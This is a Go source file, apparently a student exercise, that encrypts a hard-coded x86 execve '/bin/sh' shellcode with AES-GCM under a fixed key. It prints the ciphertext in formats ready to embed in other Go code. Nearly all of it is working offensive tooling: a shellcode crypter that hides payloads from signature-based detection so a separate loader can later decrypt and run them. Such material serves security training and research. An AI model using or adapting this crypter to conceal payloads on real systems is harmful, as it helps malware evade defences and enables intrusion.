/*
Tool:		AES Encryptor in Go
Author:		Mohit Suyal (@mosunit)
Student ID:	PA-16521
Blog:		https://mosunit.com
*/

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
)

func main() {

	// define secret key as slice of byte
	secret := []byte("iamsecret1234567")
	fmt.Printf("The symmetric key to encrypt the shellcode is: iamsecret1234567\n\n")

	// execve shellcode - spawns shell(/bin/sh) on localhost
	Shellcode := []byte{0x31, 0xc0, 0x50, 0x68, 0x6e, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x2f, 0x62, 0x69, 0x89, 0xe3, 0x50, 0x89, 0xe2, 0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80}

	// Call to encrypt function
	encrypted, err := encrypt(Shellcode, secret)
	if err != nil {
		panic(fmt.Sprintf("Unable to encrypt the data: %v", err))
	}

	fmt.Printf("The encrypted shellcode is:\n")

	// convert slice of byte returned to hex format (\x..) for printing to console
	for i := range encrypted {
		// check the index value to match the last element of the slice
		// Check if the hex coversion of slice element will be less than 2 digits; append an additional "0", if true
		if encrypted[i] < 16 {
			fmt.Printf("\\x0%x", encrypted[i])
		} else {
			fmt.Printf("\\x%x", encrypted[i])
		}
	}
	fmt.Printf("\n\nTo embedd the output in the Go code, use the following shellcode format:\n")
	// convert slice of byte returned to hex format (0x..) for printing to console
	for i := range encrypted {
		// check the index value to match the last element of the slice
		// this if statement is true for all index values except the last
		if i != len(encrypted)-1 {
			// Check if the hex coversion of slice element will be less than 2 digits; append an additional "0", if true
			if encrypted[i] < 16 {
				fmt.Printf("0x0%x,", encrypted[i])
			} else {
				fmt.Printf("0x%x,", encrypted[i])
			}
		} else {
			if encrypted[i] < 16 {
				fmt.Printf("0x0%x", encrypted[i])
			} else {
				fmt.Printf("0x%x", encrypted[i])
			}
		}
	}

}

// encrypt encrypts plain string with a secret key and returns encrypt string.
func encrypt(plainData []byte, secret []byte) ([]byte, error) {
	cipherBlock, err := aes.NewCipher(secret)
	if err != nil {
		return []byte{1}, err
	}

	aead, err := cipher.NewGCM(cipherBlock)
	if err != nil {
		return []byte{1}, err
	}

	nonce := make([]byte, aead.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return []byte{1}, err
	}

	// return the encrypted shellcode
	return aead.Seal(nonce, nonce, []byte(plainData), nil), nil

}
